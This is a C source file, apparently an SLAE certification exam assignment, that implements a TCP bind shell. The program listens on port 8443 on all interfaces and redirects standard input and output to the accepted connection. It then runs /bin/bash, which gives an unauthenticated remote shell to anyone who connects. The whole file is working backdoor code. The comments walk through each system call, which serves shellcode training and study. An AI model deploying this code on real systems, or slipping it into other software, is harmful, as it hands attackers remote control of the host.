// SLAE Exam Assignment #1: Shell Bind TCP Shellcode
// Author: Rikih Gunawan

#include<stdio.h>
#include<sys/socket.h>
#include<arpa/inet.h>

#define SHELL "/bin/bash"
#define BIND_PORT 8443

int main(int argc, char *argv[]) 
{
    int i, server_sock, new_sock;
    struct sockaddr_in server_addr;

    // http://man7.org/linux/man-pages/man2/socket.2.html
    // Create the socket:
    // Address Family - AF_INET (IPv4)
    // Type - SOCK_STREAM (TCP protocol)
    // Protocol - 0 (IP protocol)
    server_sock = socket(AF_INET, SOCK_STREAM, 0);

    // http://man7.org/linux/man-pages/man7/ip.7.html
    // Prepare the socketaddr_in structure for bind()
    // AF_INET - IPv4
    // INADDR_ANY - 0.0.0.0
    // BIND_PORT - 8443
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY; 
    server_addr.sin_port = htons(BIND_PORT);
    
    // http://man7.org/linux/man-pages/man2/bind.2.html
    // Bind a socket to the ip address and port
    bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr));

    // http://man7.org/linux/man-pages/man2/listen.2.html
    // Listen for incoming connection
    listen(server_sock, 0);

    // http://man7.org/linux/man-pages/man2/accept.2.html
    // Accept the incoming connection
    new_sock = accept(server_sock, NULL, NULL);

    // http://man7.org/linux/man-pages/man2/dup.2.html
    // Duplicate the file descriptors for stdin[0], stdout[1], stderr[2]
    //  to a newly created socket [new_sock]
    // This will redirect all input, output and error over the listening
    //  socket, allowing interacting with the executed program
	for (i=0; i<=2; i++)
	{
		dup2(new_sock, i);
	}

    // http://man7.org/linux/man-pages/man2/execve.2.html
    // Execute the program SHELL /bin/bash
    execve(SHELL, NULL, NULL);

    return 0;
}